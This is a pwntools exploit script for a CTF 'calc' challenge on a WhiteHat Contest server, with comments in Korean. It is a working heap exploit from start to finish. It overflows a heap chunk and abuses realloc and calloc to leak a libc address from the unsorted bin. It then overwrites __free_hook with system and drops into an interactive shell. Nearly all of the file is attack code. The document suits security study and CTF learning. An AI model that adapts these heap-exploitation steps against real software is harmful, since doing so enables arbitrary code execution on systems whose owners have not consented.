#-*-coding:utf-8-*-
from pwn import *


r = remote("challenges.whitehatcontest.kr", 24756)
#r = process(["./calc"], env={"LD_PRELOAD":"./libc.so.6"})


r.recvuntil(">>> ")
r.sendline('sh="'+'1'*0xa8+'"')
r.recvuntil(">>> ")
r.sendline('sh="2"')
r.recvuntil(">>> ")
r.sendline('sh="3"')
r.recvuntil(">>> ")
r.sendline('sh="'+'4'*0x58+'"')   # 여기서 realloc, chunk shrink
r.recvuntil(">>> ")
r.sendline('c="'+'5'*0x48+'"')   # calloc smallbin chunk 0x50
r.recvuntil(">>> ")
r.sendline('sh="2"')
r.recvuntil(">>> ")
r.sendline('sh="'+'3'*0xd+'"')    # prepare overflow
r.recvuntil(">>> ")
r.sendline('sh="'+'6'*0x8+'"')    # realloc
r.recvuntil(">>> ")
r.sendline('b="'+'7'*0x48+'"')   # calloc smallbin chunk 0x50
r.recvuntil(">>> ")
r.sendline('sh="overflowaaaa\xa1"')    # overflow
r.recvuntil(">>> ")

r.sendline('dummy="'+'7'*0x49+'"')    #다른 free'd chunk 제거 
r.recvuntil(">>> ")

r.sendline('b="'+'8'*0x49+'"')    # 0x48 < 0x49 occur realloc
r.recvuntil(">>> ")

r.sendline("c")
unsorted_bin = r.recvuntil(">>> ")[:4]
unsorted_bin = u32(unsorted_bin)
print("unsorted_bin leak : " + hex(unsorted_bin))

libc_base = unsorted_bin - 0x1b07b0
free_hook = libc_base + 0x1b18b0
one_gadget = libc_base + 0x3a819 # 0x5f065 0x5f066
system = libc_base + 0x3a940

r.sendline('d="'+'1234123412341234'*0x4+'"')  # 다 른 chunk가 c에 할당되는 것 방지
r.recvuntil(">>> ")
r.sendline('sh="'+'6'*0x8+'"')    # size를 0xd로 update
r.recvuntil(">>> ")
r.sendline('sh="overflowaaaa\xb1"')
r.recvuntil(">>> ")
r.sendline('b="'+'overflowoverflow'*0xa+p32(free_hook)+'\x60"')
r.recvuntil(">>> ")
r.sendline('sh')
print r.recvuntil(">>> ")    # sh->str = free_hook이므로 free_hook's value 출력. 0x00000000

r.sendline('sh="'+p32(system)+'"')  
r.interactive()